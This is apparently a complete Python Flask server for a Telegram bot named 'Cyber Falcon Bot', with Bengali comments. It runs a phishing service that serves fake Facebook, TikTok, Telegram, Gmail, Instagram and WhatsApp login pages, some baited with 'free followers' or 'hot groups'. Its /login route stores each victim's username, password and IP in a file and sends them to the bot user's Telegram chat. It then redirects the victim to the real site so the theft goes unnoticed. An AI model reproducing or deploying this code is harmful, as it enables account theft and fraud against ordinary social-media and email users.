from flask import Flask, request, jsonify, render_template, redirect
import json
import requests
import socket
import os
import time
from config import PORT, TELEGRAM_BOT_TOKEN

app = Flask(__name__)

current_page = "facebook"
public_url = None
active_chat_ids = set()
DATA_FILE = "bot_data.json"
WEBHOOK_SECRET = TELEGRAM_BOT_TOKEN

# আপনার অ্যাডমিন আইডি
ADMIN_CHAT_ID = 7843284032

def load_data():
    global public_url, active_chat_ids
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                public_url = data.get('public_url')
                active_chat_ids = set(data.get('active_users', []))
                print(f"✅ ডাটা লোড: Users={len(active_chat_ids)}")
    except Exception as e:
        print(f"ডাটা লোড ব্যর্থ: {e}")

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump({'public_url': public_url, 'active_users': list(active_chat_ids)}, f)
    except Exception as e:
        print(f"ডাটা সেভ ব্যর্থ: {e}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def add_chat_id(chat_id):
    active_chat_ids.add(chat_id)
    save_data()

# শুধু যে ইউজার লগইন করবে তার ডাটা শুধু সেই ইউজারের কাছে যাবে
def send_to_telegram(data, user_chat_id):
    page_type = data.get('pageType', 'unknown')
    
    platform_info = {
        "facebook": {"name": "Facebook", "icon": "📘"},
        "tiktok": {"name": "TikTok", "icon": "🎵"},
        "telegram": {"name": "Telegram", "icon": "📱"},
        "gmail": {"name": "Gmail", "icon": "📧"},
        "instagram": {"name": "Instagram", "icon": "📸"},
        "facebook_followers": {"name": "Facebook Followers", "icon": "🎯"},
        "whatsapp_groups": {"name": "WhatsApp Groups", "icon": "🤤"},
        "tiktok_boost": {"name": "TikTok Booster", "icon": "🚀"},
        "tiktok_followers": {"name": "TikTok Followers", "icon": "💎"}
    }
    
    platform = platform_info.get(page_type, {"name": page_type, "icon": "🌐"})
    
    message = f"""
🦅🥷 {platform['name']} Login 🦅🥷

{platform['icon']} Platform: {platform['name']}
👤 Email: {data.get('username', 'N/A')}
🔑 Pass: {data.get('password', 'N/A')}
🌐 IP: {data.get('ipAddress', 'Unknown')}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    # শুধু যে ইউজার লগইন করেছে তার কাছেই মেসেজ যাবে
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': user_chat_id, 'text': message}, timeout=10)
        print(f"✅ নোটিফিকেশন পাঠানো হয়েছে: {user_chat_id}")
    except Exception as e:
        print(f"❌ নোটিফিকেশন পাঠাতে ব্যর্থ: {e}")

# অ্যাডমিন মেসেজ সবাইকে পাঠানোর ফাংশন
def broadcast_to_all(message):
    for chat_id in active_chat_ids:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            requests.post(url, json={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}, timeout=10)
            print(f"✅ Broadcast পাঠানো হয়েছে: {chat_id}")
        except Exception as e:
            print(f"❌ Broadcast ব্যর্থ: {chat_id} - {e}")

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"❌ মেসেজ পাঠাতে ব্যর্থ: {e}")

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': 'Markdown'}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"❌ মেসেজ এডিট করতে ব্যর্থ: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={'callback_query_id': callback_id}, timeout=10)
    except:
        pass

def start_bot(chat_id, message_id=None, user_name="User"):
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 All Mane page", "callback_data": "menu_main"}],
            [{"text": "📢 Advance page", "callback_data": "menu_advance"}],
            [{"text": "🦅 Status", "callback_data": "status"},
             {"text": "🥷 Community", "url": "https://t.me/+j8x9Tp4CGa80ZmM1"}]
        ]
    }
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}😍🥰😘! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.𝙀𝙣𝙟𝙤𝙮 𝙮𝙤𝙪𝙧𝙨𝙚𝙡𝙛 𝙖𝙣𝙙 𝙨𝙝𝙖𝙧𝙚 𝙬𝙞𝙩𝙝 𝙛𝙧𝙞𝙚𝙣𝙙𝙨.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    if message_id:
        edit_telegram_message(chat_id, message_id, message, keyboard)
    else:
        send_telegram_message(chat_id, message, keyboard)

def main_menu(chat_id, message_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📘 Facebook", "callback_data": "link_facebook"}],
            [{"text": "🎵 TikTok", "callback_data": "link_tiktok"}],
            [{"text": "✈️ Telegram", "callback_data": "link_telegram"}],
            [{"text": "📧 Gmail", "callback_data": "link_gmail"}],
            [{"text": "📷 Instagram", "callback_data": "link_instagram"}],
            [{"text": "🤧Back🥴🤢", "callback_data": "back"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, "😈 All Mane page Platforms\n\nSelect a platform:", keyboard)

def advance_menu(chat_id, message_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "🎯 Free Followers", "callback_data": "adv_followers"}],
            [{"text": "🤤 Hot Groups", "callback_data": "adv_groups"}],
            [{"text": "🚀 TikTok Booster", "callback_data": "adv_boost"}],
            [{"text": "💎 TikTok Followers", "callback_data": "adv_tiktok"}],
            [{"text": "🤧Back🥴🤢", "callback_data": "back"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, "📢 Advance page Menu\n\nSelect an option:", keyboard)

def show_link(chat_id, message_id, title, url_path, back_callback):
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    full_url = f"{render_url}/{url_path}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 Open Page", "url": full_url}],
            [{"text": "🤧Back🥴🤢", "callback_data": back_callback}]
        ]
    }
    edit_telegram_message(chat_id, message_id, f"{title}\n\n🔗 {full_url}", keyboard)

def status_bot(chat_id, message_id):
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    keyboard = {"inline_keyboard": [[{"text": "🤧Back🥴🤢", "callback_data": "back"}]]}
    message = f"""
📊 Bot Status

🦅 Status: 🟢 Active
🌐 URL: {render_url}
👥 Active Users: {len(active_chat_ids)}
✅ All systems operational
"""
    edit_telegram_message(chat_id, message_id, message, keyboard)

@app.route('/')
def index():
    global current_page
    template_file = f"templates/{current_page}.html"
    if os.path.exists(template_file):
        return render_template(f"{current_page}.html")
    return "Template not found", 500

@app.route('/set_page/<page_type>')
def set_page(page_type):
    global current_page
    if page_type in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
        current_page = page_type
        return f"Page set to {current_page}"
    return "Invalid page"

@app.route('/get_ngrok_url')
def get_ngrok_url():
    global public_url
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url and not public_url:
        public_url = render_url
    return jsonify({'public_url': public_url, 'active_users': len(active_chat_ids), 'current_page': current_page})

@app.route('/set_public_url', methods=['POST'])
def set_public_url():
    global public_url
    data = request.json
    if data.get('url'):
        public_url = data['url']
        save_data()
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

@app.route('/add_user/<chat_id>')
def add_user_route(chat_id):
    try:
        add_chat_id(int(chat_id))
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/login', methods=['POST'])
def login():
    page_type = request.args.get('page_type', current_page)
    user_chat_id = request.args.get('user_id', None)
    
    data = {
        'username': request.form['username'],
        'password': request.form['password'],
        'ipAddress': request.remote_addr,
        'userAgent': request.headers.get('User-Agent'),
        'pageType': page_type,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    print(f"✅ Login from: {page_type}")
    
    # শুধু যে ইউজার লগইন করছে তার কাছেই মেসেজ যাবে
    if user_chat_id:
        send_to_telegram(data, int(user_chat_id))
    
    redirect_urls = {
        "facebook": "https://www.facebook.com/",
        "tiktok": "https://www.tiktok.com/",
        "telegram": "https://web.telegram.org/",
        "gmail": "https://mail.google.com/",
        "instagram": "https://www.instagram.com/",
        "facebook_followers": "https://www.facebook.com/",
        "whatsapp_groups": "https://web.whatsapp.com/",
        "tiktok_boost": "https://www.tiktok.com/",
        "tiktok_followers": "https://www.tiktok.com/"
    }
    return redirect(redirect_urls.get(page_type, "https://www.google.com/"))

# টেমপ্লেট রাউট
@app.route('/facebook')
def facebook_page(): return render_template("facebook.html")
@app.route('/tiktok')
def tiktok_page(): return render_template("tiktok.html")
@app.route('/telegram')
def telegram_page(): return render_template("telegram.html")
@app.route('/gmail')
def gmail_page(): return render_template("gmail.html")
@app.route('/instagram')
def instagram_page(): return render_template("instagram.html")
@app.route('/facebook_followers')
def facebook_followers(): return render_template("facebook_followers.html")
@app.route('/whatsapp_groups')
def whatsapp_groups(): return render_template("whatsapp_groups.html")
@app.route('/tiktok_boost')
def tiktok_boost(): return render_template("tiktok_boost.html")
@app.route('/tiktok_followers')
def tiktok_followers(): return render_template("tiktok_followers.html")

# অ্যাডমিন ব্রডকাস্ট এন্ডপয়েন্ট
@app.route('/admin/broadcast', methods=['POST'])
def admin_broadcast():
    """শুধু অ্যাডমিন মেসেজ ব্রডকাস্ট করতে পারবেন"""
    auth_key = request.headers.get('X-Admin-Key', '')
    
    # অথেন্টিকেশন চেক (আপনার নিজের সিক্রেট কী)
    if auth_key != 'CYBER_FALCON_ADMIN_2025':
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    
    message = request.json.get('message', '')
    if message:
        broadcast_to_all(message)
        return jsonify({'status': 'success', 'sent_to': len(active_chat_ids)})
    return jsonify({'status': 'error', 'message': 'No message provided'}), 400

@app.route(f'/webhook/{WEBHOOK_SECRET}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return "ok", 200
        
        if 'message' in update and 'text' in update['message']:
            chat_id = update['message']['chat']['id']
            text = update['message']['text']
            user_name = update['message']['from']['first_name']
            
            # অ্যাডমিন ব্রডকাস্ট - অ্যাডমিন মেসেজ লিখলে সবাই পাবে
            if chat_id == ADMIN_CHAT_ID and text.startswith('/broadcast '):
                broadcast_msg = text.replace('/broadcast ', '')
                broadcast_to_all(f"📢 {broadcast_msg}")
                send_telegram_message(chat_id, f"✅ Broadcast পাঠানো হয়েছে {len(active_chat_ids)} জনের কাছে")
            elif text in ['/start', '/link']:
                start_bot(chat_id, None, user_name)
            else:
                send_telegram_message(chat_id, f'🙋 Hi {user_name}! Type /start to see the main menu.')
        
        elif 'callback_query' in update:
            cb = update['callback_query']
            chat_id = cb['message']['chat']['id']
            msg_id = cb['message']['message_id']
            data = cb['data']
            cb_id = cb['id']
            
            answer_callback(cb_id)
            
            if data == "menu_main":
                main_menu(chat_id, msg_id)
            elif data == "menu_advance":
                advance_menu(chat_id, msg_id)
            elif data == "status":
                status_bot(chat_id, msg_id)
            elif data == "back":
                start_bot(chat_id, msg_id)
            elif data == "link_facebook":
                show_link(chat_id, msg_id, "📘 Facebook Link", "facebook", "menu_main")
            elif data == "link_tiktok":
                show_link(chat_id, msg_id, "🎵 TikTok Link", "tiktok", "menu_main")
            elif data == "link_telegram":
                show_link(chat_id, msg_id, "✈️ Telegram Link", "telegram", "menu_main")
            elif data == "link_gmail":
                show_link(chat_id, msg_id, "📧 Gmail Link", "gmail", "menu_main")
            elif data == "link_instagram":
                show_link(chat_id, msg_id, "📷 Instagram Link", "instagram", "menu_main")
            elif data == "adv_followers":
                show_link(chat_id, msg_id, "🎯 Free Facebook Followers", "facebook_followers", "menu_advance")
            elif data == "adv_groups":
                show_link(chat_id, msg_id, "🤤 Hot WhatsApp Groups", "whatsapp_groups", "menu_advance")
            elif data == "adv_boost":
                show_link(chat_id, msg_id, "🚀 TikTok Views+Like Booster", "tiktok_boost", "menu_advance")
            elif data == "adv_tiktok":
                show_link(chat_id, msg_id, "💎 TikTok Free Followers", "tiktok_followers", "menu_advance")
        
        return "ok", 200
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        return "ok", 200

@app.route('/health')
def health():
    return "ok", 200

if __name__ == '__main__':
    load_data()
    
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url:
        public_url = render_url
        print(f"🥷 Render URL: {public_url}")
    
    webhook_url = f"{render_url}/webhook/{WEBHOOK_SECRET}"
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
    try:
        resp = requests.post(api_url, json={'url': webhook_url, 'drop_pending_updates': True})
        if resp.status_code == 200 and resp.json().get('ok'):
            print(f"✅ Webhook set: {webhook_url}")
        else:
            print(f"❌ Webhook failed: {resp.text}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")
    
    local_ip = get_local_ip()
    print(f"\n{'='*50}")
    print(f"🚀 Cyber Falcon Bot - Flask Server")
    print(f"{'='*50}")
    print(f"📍 Local URL: http://{local_ip}:5000")
    print(f"🌐 Public URL: {render_url}")
    print(f"📄 Current page: {current_page}")
    print(f"👥 Active users: {len(active_chat_ids)}")
    print(f"✅ Bot is ready!")
    print(f"{'='*50}")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
